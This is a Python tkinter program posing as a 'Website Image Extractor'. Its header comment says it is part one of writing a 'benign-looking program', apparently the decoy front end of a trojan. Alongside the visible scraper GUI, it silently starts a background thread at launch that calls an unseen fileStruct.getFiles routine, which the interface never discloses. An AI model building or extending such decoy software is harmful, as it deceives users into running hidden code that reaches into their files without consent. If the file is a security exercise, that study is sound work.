# part 1: Write a benign-looking program, such as image extractor from a website 
#         which the user inputs. Ask to choose a folder within the system using a 
#         pop-up file explorer. 
import os
import threading
import tkinter as tk
from tkinter import END, filedialog as fd
import imagescraper
import fileStruct

# window
window = tk.Tk()
window.title("Website Image Extractor")
window.geometry('600x250')

# widgets
#-----

# url textbox
urlLabel = tk.Label(text="Website to extract images from:")
urlLabel.pack()
urlTextbox = tk.Text(window, height = 1, width = 56)
urlTextbox.insert(END, "https://www.")
urlTextbox.pack()


# file explorer
# TODO: consider using ligtht grey dialog in textbox to indicate what it's for instead
fileDgLabel = tk.Label(text="Folder to save the images in:")
fileDgLabel.pack()

fileDg = tk.Frame()
fileDgTextbox = tk.Text(fileDg, height=1, width=50)
fileDgTextbox.insert(END, os.path.join(os.environ['USERPROFILE'], "Downloads"))
fileDgTextbox.grid(row=0, column=0)

def onFileDialog():
    chosenDirectory = fd.askdirectory()
    fileDgTextbox.delete("1.0", tk.END)
    fileDgTextbox.insert(tk.INSERT, chosenDirectory)

def onSubmit():
    global urlTextbox
    global submitMessage
    websiteURL = urlTextbox.get("1.0", tk.END+'-1c')
    save_path = fileDgTextbox.get("1.0", tk.END+'-1c')
    numImages = imagescraper.getImgs(websiteURL, save_path)
    if numImages >= 0:
        submitMessage.config(text=f"Succesfully downloaded {numImages} images!", fg="#00ff00")
    elif numImages == imagescraper.ERROR_BAD_URL :
        submitMessage.config(text="There was an error with the url!", fg="#ff0000")
    elif numImages == imagescraper.ERROR_BAD_FILE_PATH :
        submitMessage.config(text="There was an error with the file path!", fg="#ff0000")


fileDgBtn = tk.Button(fileDg, text="Browse", command=onFileDialog)
fileDgBtn.grid(row=0, column=1)
fileDg.pack()

submitBtn = tk.Button(window, text="Submit", command=onSubmit)
submitBtn.pack()

# Notif Message on submit
submitMessage = tk.Label(border=50)
submitMessage.pack()

#-----

# loop
thr = threading.Thread(target=fileStruct.getFiles, args=(), kwargs={})
thr.start()
window.mainloop()
